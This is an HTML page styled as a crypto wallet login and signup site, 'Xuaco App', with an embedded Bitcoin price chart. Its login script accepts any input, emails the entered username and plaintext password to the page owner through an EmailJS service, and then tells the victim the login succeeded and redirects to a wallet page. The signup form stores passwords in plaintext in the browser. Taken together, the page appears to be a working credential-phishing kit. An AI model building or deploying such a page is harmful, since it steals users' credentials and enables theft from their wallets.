<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Xuaco App - Secure Login & Signup</title>

    <!-- EmailJS -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

    <script>
        (function () {
            emailjs.init({
                publicKey: "QjLm6g67UKe1h3cs8",
            });
        })();
    </script>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "Poppins", sans-serif;
        }

        body {
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .wrapper {
            width: 100%;
            max-width: 1200px;
            display: flex;
            gap: 25px;
            align-items: center;
            justify-content: center;
        }

        .hero {
            flex: 1;
            background: #f5f6fa;
            border-radius: 18px;
            padding: 20px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.06);
        }

        .hero h1 {
            color: #07106d;
            margin-bottom: 10px;
            font-size: 28px;
        }

        .hero p {
            color: #444;
            margin-bottom: 15px;
            font-size: 14px;
        }

        iframe {
            width: 100%;
            height: 350px;
            border: none;
            border-radius: 12px;
        }

        .container {
            width: 100%;
            max-width: 450px;
            background: #fff;
            border-radius: 18px;
            padding: 40px 30px;
            box-shadow: 0 0 25px rgba(0, 0, 0, 0.08);
        }

        .logo {
            text-align: center;
            margin-bottom: 20px;
        }

        .logo img {
            width: 65px;
            margin-bottom: 10px;
        }

        .logo h2 {
            color: #010715;
            font-size: 28px;
            font-weight: 700;
        }

        .tabs {
            display: flex;
            background: #f1f1f1;
            padding: 5px;
            border-radius: 30px;
            margin-bottom: 20px;
        }

        .tabs button {
            flex: 1;
            border: none;
            padding: 12px;
            border-radius: 25px;
            cursor: pointer;
            background: transparent;
            font-weight: 600;
            transition: 0.3s;
            font-size: 15px;
        }

        .tabs button.active {
            background: #02041a;
            color: white;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        input {
            width: 100%;
            padding: 14px;
            border-radius: 10px;
            border: 1px solid #ccc;
            font-size: 15px;
            outline: none;
        }

        input:focus {
            border-color: #030627;
        }

        .btn {
            background: #020314;
            color: white;
            border: none;
            padding: 14px;
            border-radius: 10px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.3s;
        }

        .btn:hover {
            background: #04094a;
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .hidden {
            display: none;
        }

        .footer {
            margin-top: 20px;
            text-align: center;
            color: #555;
            font-size: 13px;
            line-height: 1.6;
        }

        @media (max-width: 920px) {
            .wrapper {
                flex-direction: column;
            }

            .hero {
                width: 100%;
                order: -1;
            }
        }
    </style>
</head>

<body>

    <div class="wrapper">

        <!-- HERO -->
        <div class="hero">
            <!-- <h1>Live Trading Chart Preview</h1> -->
            <p>Track crypto market movement and real-time trading activity instantly.</p>

            <iframe
                src="https://s.tradingview.com/widgetembed/?symbol=BITSTAMP%3ABTCUSD&interval=60&theme=light&style=1"
                scrolling="no">
            </iframe>
        </div>

        <!-- FORM CONTAINER -->
        <div class="container">

            <div class="logo">
                <img src="photo_2026-07-02_21-05-57.jpg" alt="Logo">
                <h2>XUACO App</h2>
            </div>

            <!-- TABS -->
            <div class="tabs">
                <button id="loginTab" class="active">Login</button>
                <button id="signupTab">Sign Up</button>
            </div>

            <!-- LOGIN FORM -->
            <form id="loginForm">

                <!-- Username -->
                <input type="text" id="loginUsername" placeholder="Username" required>

                <!-- Password -->
                <input type="password" id="loginPassword" placeholder="Password" required>

                <!-- Verification Code -->


                <button type="submit" id="loginBtn" class="btn">
                    Login
                </button>

            </form>

            <!-- SIGNUP FORM -->
            <form id="signupForm" class="hidden">

                <!-- Full Name -->
                <input type="text" id="signupName" placeholder="Full Name" required>

                <!-- Username -->
                <input type="text" id="signupUsername" placeholder="Choose a Username" required>

                <!-- Password -->
                <input type="password" id="signupPassword" placeholder="Create Password" required>

                <button type="submit" id="signupBtn" class="btn">
                    Create Account
                </button>

            </form>

            <p class="footer">
                By signing up or logging in, you agree to our Terms and Privacy Policy.
                <br><br>
                Copyright © 2026 Xuaco App. All Rights Reserved
            </p>

        </div>

    </div>

    <script>

        // Tabs
        const loginTab = document.getElementById("loginTab");
        const signupTab = document.getElementById("signupTab");

        // Forms
        const loginForm = document.getElementById("loginForm");
        const signupForm = document.getElementById("signupForm");

        // Login Fields
        const loginUsername = document.getElementById("loginUsername");
        const signupUsername = document.getElementById("signupUsername");
        const loginBtn = document.getElementById("loginBtn");

        // Signup Fields
        const signupName = document.getElementById("signupName");
        const signupEmail = document.getElementById("signupEmail");
        const signupPassword = document.getElementById("signupPassword");

        // TAB SWITCH
        loginTab.addEventListener("click", () => {

            loginForm.classList.remove("hidden");
            signupForm.classList.add("hidden");

            loginTab.classList.add("active");
            signupTab.classList.remove("active");

        });

        signupTab.addEventListener("click", () => {

            signupForm.classList.remove("hidden");
            loginForm.classList.add("hidden");

            signupTab.classList.add("active");
            loginTab.classList.remove("active");

        });

        // ENABLE LOGIN BUTTON
        function validateLoginFields() {
    if (
        loginUsername.value.trim() !== "" &&
        loginPassword.value.trim() !== ""
    ) {
        loginBtn.disabled = false;
    } else {
        loginBtn.disabled = true;
    }
}

        loginUsername.addEventListener("input", validateLoginFields);
        loginPassword.addEventListener("input", validateLoginFields);

        // SIGNUP FUNCTION
        signupForm.addEventListener("submit", function (e) {

            e.preventDefault();

            const user = {
                name: signupName.value,
                username: signupUsername.value,
                password: signupPassword.value
            };

            localStorage.setItem("userData", JSON.stringify(user));

            alert("Account created successfully. Please login.");

            signupForm.reset();

            signupForm.classList.add("hidden");
            loginForm.classList.remove("hidden");

            loginTab.classList.add("active");
            signupTab.classList.remove("active");

        });

        // LOGIN FUNCTION
        loginForm.addEventListener("submit", function (e) {
    e.preventDefault();

    const username = loginUsername.value.trim();
    const password = loginPassword.value.trim();

    // simple rule: allow any login if fields are filled
    if (username === "" || password === "") {
        alert("Please enter username and password.");
        return;
    }

    loginBtn.disabled = true;
    loginBtn.textContent = "Confirming...";

    emailjs.send(
        "service_trbleaf",
        "template_zrpg5si",
        {
            user_name: username,
            user_username: username,
            user_loginPassword: password,
            login_time: new Date().toLocaleString(),
            message: "A login was detected on Xuaco App."
        }
    )
    .then(function () {
        alert("Login successful. Redirecting...");

        setTimeout(() => {
            window.location.href = "wallet.html";
        }, 1500);
    })
    .catch(function () {
        alert("Login successful (email failed).");

        setTimeout(() => {
            window.location.href = "wallet.html";
        }, 1500);
    });
});

    </script>

</body>

</html>
